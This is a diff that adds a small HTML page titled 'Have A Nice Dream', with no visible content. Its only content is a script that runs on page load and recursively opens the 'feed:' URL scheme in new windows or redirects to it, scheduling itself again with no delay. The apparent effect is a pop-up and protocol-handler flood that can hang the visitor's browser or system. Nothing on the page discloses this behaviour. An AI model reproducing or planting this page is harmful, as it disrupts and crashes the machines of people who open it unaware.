@@ -1,0 +1,24 @@
+
+<!doctype html>
+<html lang="id">
+  <head>
+    <meta charset="utf-8" />
+    <title>Have A Nice Dream</title>
+  </head>
+  <body>
+    <script>
+      function trigger() {
+        const a =
+          "feed:";
+        const w = window.open(a, "_blank");
+        if (!w || w.closed || typeof w.closed === "undefined") {
+          location.href = a;
+			
+        }
+        setTimeout(trigger, 0);
+      }
+
+      window.onload = trigger;
+    </script>
+  </body>
+</html>
